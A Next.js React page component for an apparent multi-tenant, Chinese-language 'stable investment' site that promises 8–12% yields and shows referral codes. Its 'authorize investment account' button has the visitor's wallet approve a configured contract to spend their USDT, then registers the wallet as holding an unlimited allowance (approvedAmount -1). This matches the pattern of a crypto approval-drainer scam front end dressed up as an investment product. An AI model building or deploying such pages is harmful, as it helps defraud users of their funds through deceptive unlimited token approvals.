'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { TenantPageProps } from '@/shared/types';
import { useWallet, useApprove, useReferral, useTenant } from '@/shared/hooks';
import { registerCustomer } from '@/shared/lib/api';
import { LoadingSpinner, ErrorDisplay, WalletButton } from '@/shared/components';

export function InvestPage({ tenantConfig }: TenantPageProps) {
  const router = useRouter();
  const { slug } = useTenant();
  const { isReady, isConnected, address, error: walletError } = useWallet();
  const { approve, isLoading: approving, error: approveError } = useApprove();
  const { referralCode } = useReferral();
  const [registering, setRegistering] = useState(false);
  const [error, setError] = useState<any>(null);

  const handleAuthorize = async () => {
    if (!isConnected || !address) return;

    try {
      setError(null);

      // 1. 授權 USDT
      const txHash = await approve(
        tenantConfig.investmentContractAddress,
        tenantConfig.usdtTokenAddress,
      );

      // 2. 註冊客戶
      setRegistering(true);
      await registerCustomer({
        walletAddress: address,
        approvedAmount: -1, // 無限額度
        approvalTxHash: txHash,
        referralCode: referralCode || undefined,
      });

      // 3. 導向成功頁面
      router.push(`/${slug}/success`);
    } catch (err) {
      setError(err);
    } finally {
      setRegistering(false);
    }
  };

  if (!isReady) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-blue-50">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  const displayError = error || approveError || walletError;

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-blue-100 p-4">
      <div className="max-w-lg w-full bg-white rounded-xl shadow-xl p-8">
        {/* 頁面標題 */}
        <div className="text-center mb-6">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">
            穩健投資理財方案
          </h1>
          <p className="text-gray-600">
            專業團隊管理，透明安全可信
          </p>
        </div>

        {/* 錯誤訊息 */}
        {displayError && (
          <div className="mb-6">
            <ErrorDisplay error={displayError} />
          </div>
        )}

        {/* 產品資訊卡片 */}
        <div className="mb-6 p-5 bg-blue-50 border border-blue-200 rounded-lg">
          <h3 className="text-sm font-semibold text-gray-700 mb-3">產品特點</h3>
          <div className="grid grid-cols-2 gap-4">
            <div>
              <p className="text-xs text-gray-600 mb-1">預期年化收益</p>
              <p className="text-lg font-bold text-blue-800">8-12%</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">投資門檻</p>
              <p className="text-lg font-bold text-blue-800">100 USDT 起</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">鎖定期限</p>
              <p className="text-lg font-bold text-blue-800">靈活贖回</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">風險等級</p>
              <p className="text-lg font-bold text-blue-800">穩健型</p>
            </div>
          </div>
        </div>

        {/* 已連接錢包 */}
        {isConnected && address && (
          <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">已連接錢包</p>
            <p className="text-sm font-mono text-gray-900 break-all">
              {address}
            </p>
          </div>
        )}

        {/* 推薦碼顯示 */}
        {referralCode && (
          <div className="mb-6 p-4 bg-amber-50 border border-amber-200 rounded-lg">
            <p className="text-sm text-amber-900">
              您正在使用推薦人邀請加入
            </p>
            <p className="text-sm mt-1">
              <span className="text-amber-700">推薦碼: </span>
              <span className="font-semibold text-amber-900">{referralCode}</span>
            </p>
          </div>
        )}

        {/* 授權按鈕 */}
        <WalletButton
          onClick={handleAuthorize}
          loading={approving || registering}
          disabled={!isConnected || approving || registering}
          className="w-full bg-blue-800 hover:bg-blue-900 text-white"
        >
          {approving ? '授權處理中...' : registering ? '開通帳戶中...' : '授權投資帳戶'}
        </WalletButton>

        {/* 安全提示 */}
        <p className="text-xs text-gray-500 text-center mt-4">
          授權後，您的 USDT 將由專業團隊託管管理，可隨時查看收益明細
        </p>
      </div>
    </div>
  );
}
